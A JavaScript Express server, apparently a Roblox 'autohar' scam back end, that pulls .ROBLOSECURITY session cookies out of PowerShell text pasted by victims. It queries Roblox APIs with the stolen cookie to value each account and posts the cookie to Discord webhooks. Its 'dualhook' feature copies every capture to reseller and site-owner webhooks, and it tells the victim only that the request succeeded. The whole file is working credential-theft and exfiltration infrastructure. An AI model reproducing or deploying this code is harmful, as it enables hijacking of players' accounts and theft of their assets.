import express from 'express';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Directory management
const DIRECTORIES_FILE = path.join(__dirname, 'directories.json');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!

// Load directories from file
function loadDirectories() {
  try {
    if (fs.existsSync(DIRECTORIES_FILE)) {
      const data = fs.readFileSync(DIRECTORIES_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error('Error loading directories:', error);
  }
  return {};
}

// Save directories to file
function saveDirectories(directories) {
  try {
    fs.writeFileSync(DIRECTORIES_FILE, JSON.stringify(directories, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving directories:', error);
    return false;
  }
}

// Generate API token if not set
const API_TOKEN = process.env.API_TOKEN || crypto.randomBytes(32).toString('hex');
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : [];

// Middleware to validate requests
function validateRequest(req, res, next) {
  // Check origin for browser requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  // Allow requests from same origin (your frontend)
  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      console.log(`❌ Blocked request from unauthorized origin: ${origin}`);
      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  }

  // Check for API token in headers
  const providedToken = req.get('X-API-Token');
  if (!providedToken || providedToken !== API_TOKEN) {
    console.log(`❌ Invalid or missing API token from ${req.ip}`);
    return res.status(401).json({ error: 'Invalid API token' });
  }

  next();
}

app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve the create directory page
app.get('/create', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'create.html'));
});

// Endpoint to get API token for frontend
app.get('/api/token', (req, res) => {
  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: API_TOKEN });
});

// API endpoint to create new directories
app.post('/api/create-directory', async (req, res) => {
  try {
    const { directoryName, webhookUrl, serviceType, dualhookWebhookUrl } = req.body;

    // Validate directory name
    if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName)) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid primary webhook URL' });
    }

    // Validate dualhook webhook if dualhook service type
    if (serviceType === 'dualhook' && (!dualhookWebhookUrl || !dualhookWebhookUrl.startsWith('http'))) {
      return res.status(400).json({ error: 'Invalid dualhook webhook URL' });
    }

    // Load existing directories
    const directories = loadDirectories();

    // Check if directory already exists
    if (directories[directoryName]) {
      return res.status(409).json({ error: 'Directory already exists' });
    }

    // Create new directory entry
    directories[directoryName] = {
      webhookUrl: webhookUrl,
      serviceType: serviceType || 'single',
      dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      subdirectories: {} // For nested directories in dualhook
    };

    // Save directories
    if (!saveDirectories(directories)) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }

    console.log(`✅ Created new directory: ${directoryName}`);

    // Send notification to the webhook about successful directory creation
    try {
      const serviceTypeLabel = serviceType === 'dualhook' 
        ? `${directoryName.toUpperCase()} GENERATOR` 
        : 'LUNIX AUTOHAR';
      const description = serviceType === 'dualhook' 
        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\``
        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\``;

      const notificationPayload = {
        embeds: [{
          title: serviceTypeLabel,
          description: description,
          color: 0x8B5CF6,
          footer: {
            text: serviceType === 'dualhook' 
              ? `Made By ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)}`
              : "Made By Lunix"
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });

      console.log(`✅ Sent creation notification to webhook for directory: ${directoryName}`);
    } catch (webhookError) {
      console.log(`⚠️ Failed to send creation notification to webhook: ${webhookError.message}`);
      // Don't fail the directory creation if webhook notification fails
    }

    res.json({ 
      success: true, 
      directoryName: directoryName,
      apiToken: directories[directoryName].apiToken
    });

  } catch (error) {
    console.error('Error creating directory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {
    console.log('🔍 Fetching user data from Roblox API...');

    // Get user info
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    if (!userResponse.ok) {
      console.log('❌ Failed to fetch user info');
      return null;
    }

    const userData = await userResponse.json();
    console.log('✅ User data fetched successfully');

    // Get premium status
    const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    let premiumData = { isPremium: false };
    if (premiumResponse.ok) {
      premiumData = await premiumResponse.json();
    }

    // Get Robux balance
    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    let robuxData = { robux: 0 };
    if (robuxResponse.ok) {
      robuxData = await robuxResponse.json();
    }

    // Get user's age (account creation date)
    const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    let ageData = { created: null };
    if (ageResponse.ok) {
      ageData = await ageResponse.json();
    }

    // Get groups owned
    const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    let groupsOwned = 0;
    if (groupsResponse.ok) {
      const groupsData = await groupsResponse.json();
      groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
    }

    // Get inventory counts
    const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    let inventory = { hairs: 0, bundles: 0, faces: 0 };
    if (inventoryResponse.ok) {
      const inventoryData = await inventoryResponse.json();
      // This is simplified - you might need to categorize items properly
      inventory.hairs = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Hair').length : 0;
      inventory.faces = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Face').length : 0;
      inventory.bundles = inventoryData.data ? inventoryData.data.filter(item => item.assetType === 'Bundle').length : 0;
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    return {
      username: userData.displayName || userData.name,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      rap: 0, // RAP requires additional API calls to asset values
      summary: 302, // This would need to be calculated from various metrics
      creditBalance: 0, // This requires different API endpoint
      savedPayment: false, // This requires payment API access
      robuxIncoming: 302, // This requires economy API
      robuxOutgoing: 337, // This requires economy API
      korblox: false, // Check if user owns Korblox items
      headless: false, // Check if user owns Headless Head
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      placeVisits: 5, // This requires games API
      inventory: inventory
    };

  } catch (error) {
    console.error('❌ Error fetching Roblox user data:', error);
    return null;
  }
}

// Function to send custom dualhook webhook with directory branding
async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {
  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: `${directoryName.toUpperCase()} AUTOHAR`,
      description: `Ur ${directoryName.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${host}/${directoryName}/${subdirectoryName}\``,
      color: 0x8B5CF6,
      footer: {
        text: `Made by ${directoryName}`
      }
    };

    const payload = {
      embeds: [embed]
    };

    console.log('Sending custom dualhook webhook payload...');

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Webhook response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }

    console.log('✅ Successfully sent custom dualhook webhook');
    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send custom dualhook webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Function to send Discord webhook with user data (supports custom webhook URLs)
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null) {
  const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;

  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured in environment variables');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: "LUNIX AUTOHAR",
      description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
      color: 0x8B5CF6,
      footer: {
        text: "Made By Lunix"
      }
    };

    const payload = {
      embeds: [embed]
    };

    console.log('Sending webhook payload...');

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Webhook response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }

    console.log('✅ Successfully sent to Discord webhook');
    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// API endpoint to convert PowerShell to .ROBLOSECURITY
app.post('/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;

    console.log('📥 Received request');

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    console.log('🔍 Searching for ROBLOSECURITY token...');
    console.log('📝 Input received:', input.substring(0, 200) + (input.length > 200 ? '...' : ''));

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
    const match = input.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      console.log('✅ Token found! Fetching user data...');

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      if (userData) {
        console.log(`✅ User data fetched for: ${userData.username}`);
      } else {
        console.log('⚠️ Could not fetch user data, sending token only');
      }

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);

      if (!webhookResult.success) {
        console.log('❌ Webhook failed:', webhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }

      console.log('✅ Token and user data sent to Discord successfully');
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Send error to Discord too for debugging
      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `❌ **No Token Found**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
            })
          });
        } catch (e) {
          console.log('Failed to send error to Discord:', e.message);
        }
      }
    }

    // Always return success - user checks Discord for actual results
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Dynamic route handler for custom directories
app.get('/:directory', (req, res) => {
  const directoryName = req.params.directory;
  const directories = loadDirectories();

  if (directories[directoryName]) {
    // Serve a custom page for this directory or redirect to main page
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Directory not found' });
  }
});

// Route handler for dualhook create page
app.get('/:directory/create', (req, res) => {
  const directoryName = req.params.directory;
  const directories = loadDirectories();

  if (directories[directoryName] && directories[directoryName].serviceType === 'dualhook') {
    res.sendFile(path.join(__dirname, 'public', 'dualhook-create.html'));
  } else {
    res.status(404).json({ error: 'Dualhook directory not found' });
  }
});

// Route handler for subdirectories
app.get('/:directory/:subdirectory', (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = loadDirectories();

  if (directories[directoryName] && directories[directoryName].subdirectories[subdirectoryName]) {
    // Serve the same page for subdirectories
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Subdirectory not found' });
  }
});

// API endpoint for custom directory requests
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;

    console.log(`📥 Received request for directory: ${directoryName}`);

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    console.log('🔍 Searching for ROBLOSECURITY token...');
    console.log('📝 Input received:', input.substring(0, 200) + (input.length > 200 ? '...' : ''));

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
    const match = input.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      console.log(`✅ Token found for directory ${directoryName}! Fetching user data...`);

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      if (userData) {
        console.log(`✅ User data fetched for: ${userData.username}`);
      } else {
        console.log('⚠️ Could not fetch user data, sending token only');
      }

      // Send to directory webhook
      const directoryWebhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData, directoryConfig.webhookUrl);

      // Always send to site owner (main webhook) - check both environment variable and default webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData, siteOwnerWebhookUrl);
      }

      if (!directoryWebhookResult.success) {
        console.log('❌ Directory webhook failed:', directoryWebhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Directory webhook failed: ${directoryWebhookResult.error}` 
        });
      }

      console.log(`✅ Token and user data sent to directory ${directoryName} webhook successfully`);
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Send error to directory webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `❌ **No Token Found in Directory: ${directoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
          })
        });
      } catch (e) {
        console.log('Failed to send error to directory webhook:', e.message);
      }

      // Also send error to site owner webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        try {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `❌ **No Token Found in Directory: ${directoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
            })
          });
        } catch (e) {
          console.log('Failed to send error to site owner webhook:', e.message);
        }
      }
    }

    // Always return success - user checks Discord for actual results
    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// API endpoint to create subdirectories for Dualhook users
app.post('/:directory/api/create-subdirectory', async (req, res) => {
  try {
    const parentDirectory = req.params.directory;
    const { subdirectoryName, webhookUrl } = req.body;
    
    // Load directories
    const directories = loadDirectories();
    
    // Check if parent directory exists and is dualhook type
    if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(404).json({ error: 'Parent directory not found or not a Dualhook generator' });
    }
    
    // Validate subdirectory name
    if (!subdirectoryName || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
      return res.status(400).json({ error: 'Invalid subdirectory name. Use only lowercase letters, numbers, and hyphens.' });
    }
    
    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }
    
    // Check if subdirectory already exists
    if (directories[parentDirectory].subdirectories[subdirectoryName]) {
      return res.status(409).json({ error: 'Subdirectory already exists' });
    }
    
    // Create subdirectory
    directories[parentDirectory].subdirectories[subdirectoryName] = {
      webhookUrl: webhookUrl,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex')
    };
    
    // Save directories
    if (!saveDirectories(directories)) {
      return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
    }
    
    console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);
    
    // Send notification to subdirectory webhook with user's link
    try {
      const notificationPayload = {
        embeds: [{
          title: `${parentDirectory.toUpperCase()} AUTOHAR`,
          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\``,
          color: 0x8B5CF6,
          footer: {
            text: `Made by ${parentDirectory}`
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });

      console.log(`✅ Sent subdirectory creation notification with URL to: ${subdirectoryName}`);
    } catch (webhookError) {
      console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
    }
    
    res.json({
      success: true,
      parentDirectory: parentDirectory,
      subdirectoryName: subdirectoryName,
      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken
    });
    
  } catch (error) {
    console.error('Error creating subdirectory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get API token for specific directory
app.get('/:directory/api/token', (req, res) => {
  const directoryName = req.params.directory;
  const directories = loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).json({ error: 'Directory not found' });
  }

  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: directories[directoryName].apiToken });
});

// Get API token for subdirectories
app.get('/:directory/:subdirectory/api/token', (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = loadDirectories();

  if (!directories[directoryName] || !directories[directoryName].subdirectories[subdirectoryName]) {
    return res.status(404).json({ error: 'Subdirectory not found' });
  }

  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: directories[directoryName].subdirectories[subdirectoryName].apiToken });
});

// API endpoint for subdirectory requests (triple webhook delivery)
app.post('/:directory/:subdirectory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const subdirectoryName = req.params.subdirectory;
    const directories = loadDirectories();

    // Check if subdirectory exists
    if (!directories[directoryName] || !directories[directoryName].subdirectories[subdirectoryName]) {
      return res.status(404).json({ error: 'Subdirectory not found' });
    }

    const parentConfig = directories[directoryName];
    const subdirectoryConfig = directories[directoryName].subdirectories[subdirectoryName];

    // Validate API token for this specific subdirectory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for subdirectory ${directoryName}/${subdirectoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
    }

    let input;
    let scriptType;

    console.log(`📥 Received request for subdirectory: ${directoryName}/${subdirectoryName}`);

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Look for .ROBLOSECURITY cookie
    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
    const match = input.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');
      const userAgent = req.headers['user-agent'] || 'Unknown';

      console.log(`✅ Token found for subdirectory ${directoryName}/${subdirectoryName}! Fetching user data...`);

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;

      // 1. Send to subdirectory webhook (user's webhook) - Custom embed
      const subdirectoryWebhookResult = await sendCustomDualhookWebhook(token, userAgent, userData, subdirectoryConfig.webhookUrl, directoryName, subdirectoryName, req.get('host'));

      // 2. Send to parent dualhook webhook
      if (parentConfig.dualhookWebhookUrl) {
        await sendToDiscord(token, userAgent, scriptLabel, userData, parentConfig.dualhookWebhookUrl);
      }

      // 3. Send to site owner webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, scriptLabel, userData, siteOwnerWebhookUrl);
      }

      if (!subdirectoryWebhookResult.success) {
        console.log('❌ Subdirectory webhook failed:', subdirectoryWebhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
        });
      }

      console.log(`✅ Triple webhook delivery completed for subdirectory ${directoryName}/${subdirectoryName}`);
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Send error to all three webhooks
      const errorMessage = `❌ **No Token Found in Subdirectory: ${directoryName}/${subdirectoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``;
      
      // Subdirectory webhook
      try {
        await fetch(subdirectoryConfig.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: errorMessage })
        });
      } catch (e) {
        console.log('Failed to send error to subdirectory webhook:', e.message);
      }

      // Parent dualhook webhook
      if (parentConfig.dualhookWebhookUrl) {
        try {
          await fetch(parentConfig.dualhookWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: errorMessage })
          });
        } catch (e) {
          console.log('Failed to send error to dualhook webhook:', e.message);
        }
      }

      // Site owner webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        try {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: errorMessage })
          });
        } catch (e) {
          console.log('Failed to send error to site owner webhook:', e.message);
        }
      }
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully with triple webhook delivery!',
      directory: directoryName,
      subdirectory: subdirectoryName
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin panel available at: /create`);
  console.log(`Admin password: ${ADMIN_PASSWORD}`);

  if (!process.env.API_TOKEN) {
    console.log(`Generated API Token: ${API_TOKEN}`);
    console.log('Set API_TOKEN environment variable to use a custom token');
  }

  // Log existing directories
  const directories = loadDirectories();
  const directoryNames = Object.keys(directories);
  if (directoryNames.length > 0) {
    console.log('📁 Active directories:', directoryNames.join(', '));
    
    // Log subdirectories for dualhook services
    directoryNames.forEach(dir => {
      if (directories[dir].serviceType === 'dualhook') {
        const subdirs = Object.keys(directories[dir].subdirectories);
        if (subdirs.length > 0) {
          console.log(`🔗 Dualhook subdirectories for ${dir}:`, subdirs.join(', '));
        }
      }
    });
  }
});